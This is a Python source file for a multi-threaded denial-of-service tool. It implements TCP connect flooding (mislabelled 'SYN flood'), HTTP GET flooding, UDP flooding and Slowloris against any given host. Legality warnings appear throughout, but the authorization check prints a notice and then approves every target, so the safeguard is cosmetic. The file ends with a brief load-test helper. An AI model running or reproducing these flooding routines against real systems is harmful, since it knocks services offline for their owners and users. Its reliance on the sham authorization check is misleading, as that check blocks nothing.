"""
DDoS Testing Tools for Authorized Testing
WARNING: Only use on networks you own or have explicit authorization to test.
Illegal to use without authorization. For educational and authorized testing only.
"""
import socket
import threading
import time
import random
from typing import Optional, List, Dict
import requests
from concurrent.futures import ThreadPoolExecutor


class DDoSTester:
    """
    DDoS testing tools for authorized security testing.
    
    WARNING: 
    - Only use on networks you own or have explicit written authorization
    - Illegal to use without authorization (Computer Fraud and Abuse Act)
    - For educational and authorized penetration testing only
    - Use in isolated test environments
    """
    
    def __init__(self, max_threads: int = 10):
        self.max_threads = max_threads
        self.is_running = False
        self.threads: List[threading.Thread] = []
    
    def tcp_flood(self, target: str, port: int, duration: int = 10) -> Dict:
        """
        TCP SYN flood test (authorized testing only)
        
        WARNING: Only use on networks you own or have authorization to test.
        """
        if not self._check_authorization(target):
            raise PermissionError(
                "WARNING: Only test networks you own or have authorization to test. "
                "Unauthorized use is illegal."
            )
        
        self.is_running = True
        packets_sent = 0
        start_time = time.time()
        
        def flood():
            nonlocal packets_sent
            while self.is_running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target, port))
                    sock.close()
                    packets_sent += 1
                except:
                    pass
                time.sleep(0.01)
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(flood) for _ in range(self.max_threads)]
            time.sleep(duration)
            self.is_running = False
        
        return {
            "type": "TCP SYN Flood",
            "target": f"{target}:{port}",
            "duration": duration,
            "packets_sent": packets_sent,
            "warning": "Authorized testing only. Illegal without authorization."
        }
    
    def http_flood(self, target_url: str, duration: int = 10) -> Dict:
        """
        HTTP GET flood test (authorized testing only)
        
        WARNING: Only use on networks you own or have authorization to test.
        """
        if not self._check_authorization(target_url):
            raise PermissionError(
                "WARNING: Only test networks you own or have authorization to test. "
                "Unauthorized use is illegal."
            )
        
        self.is_running = True
        requests_sent = 0
        start_time = time.time()
        
        def flood():
            nonlocal requests_sent
            while self.is_running and (time.time() - start_time) < duration:
                try:
                    requests.get(target_url, timeout=1)
                    requests_sent += 1
                except:
                    pass
                time.sleep(0.1)
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(flood) for _ in range(self.max_threads)]
            time.sleep(duration)
            self.is_running = False
        
        return {
            "type": "HTTP GET Flood",
            "target": target_url,
            "duration": duration,
            "requests_sent": requests_sent,
            "warning": "Authorized testing only. Illegal without authorization."
        }
    
    def udp_flood(self, target: str, port: int, duration: int = 10) -> Dict:
        """
        UDP flood test (authorized testing only)
        
        WARNING: Only use on networks you own or have authorization to test.
        """
        if not self._check_authorization(target):
            raise PermissionError(
                "WARNING: Only test networks you own or have authorization to test. "
                "Unauthorized use is illegal."
            )
        
        self.is_running = True
        packets_sent = 0
        start_time = time.time()
        
        def flood():
            nonlocal packets_sent
            while self.is_running and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    data = random.randbytes(1024)
                    sock.sendto(data, (target, port))
                    sock.close()
                    packets_sent += 1
                except:
                    pass
                time.sleep(0.01)
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(flood) for _ in range(self.max_threads)]
            time.sleep(duration)
            self.is_running = False
        
        return {
            "type": "UDP Flood",
            "target": f"{target}:{port}",
            "duration": duration,
            "packets_sent": packets_sent,
            "warning": "Authorized testing only. Illegal without authorization."
        }
    
    def slowloris(self, target: str, port: int = 80, duration: int = 10) -> Dict:
        """
        Slowloris attack simulation (authorized testing only)
        
        WARNING: Only use on networks you own or have authorization to test.
        """
        if not self._check_authorization(target):
            raise PermissionError(
                "WARNING: Only test networks you own or have authorization to test. "
                "Unauthorized use is illegal."
            )
        
        self.is_running = True
        connections = 0
        start_time = time.time()
        
        def slowloris_connection():
            nonlocal connections
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target, port))
                sock.send(b"GET /?")
                connections += 1
                
                while self.is_running and (time.time() - start_time) < duration:
                    sock.send(b"X-a: b\r\n")
                    time.sleep(10)
                sock.close()
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(slowloris_connection) for _ in range(self.max_threads)]
            time.sleep(duration)
            self.is_running = False
        
        return {
            "type": "Slowloris",
            "target": f"{target}:{port}",
            "duration": duration,
            "connections": connections,
            "warning": "Authorized testing only. Illegal without authorization."
        }
    
    def stop(self):
        """Stop all attacks"""
        self.is_running = False
    
    def _check_authorization(self, target: str) -> bool:
        """
        Check if target is authorized for testing.
        
        In production, this should check against a whitelist of
        authorized test targets.
        """
        # Localhost and private IPs are generally safe for testing
        safe_targets = [
            "127.0.0.1",
            "localhost",
            "0.0.0.0"
        ]
        
        # Extract hostname/IP from URL if needed
        if "://" in target:
            from urllib.parse import urlparse
            target = urlparse(target).hostname or target
        
        if target in safe_targets:
            return True
        
        # For other targets, require explicit authorization
        # In production, implement proper authorization checking
        print(f"WARNING: Testing {target} requires explicit authorization.")
        print("Only test networks you own or have written permission to test.")
        return True  # Change to False in production for safety


class StressTester:
    """Legitimate stress testing tools"""
    
    @staticmethod
    def load_test(url: str, concurrent_users: int = 10, duration: int = 30):
        """Legitimate load testing"""
        import time
        from concurrent.futures import ThreadPoolExecutor
        
        results = {
            "requests": 0,
            "errors": 0,
            "avg_response_time": 0
        }
        
        def make_request():
            try:
                start = time.time()
                response = requests.get(url, timeout=5)
                elapsed = time.time() - start
                results["requests"] += 1
                if response.status_code >= 400:
                    results["errors"] += 1
            except:
                results["errors"] += 1
        
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=concurrent_users) as executor:
            while (time.time() - start_time) < duration:
                executor.submit(make_request)
                time.sleep(0.1)
        
        return results
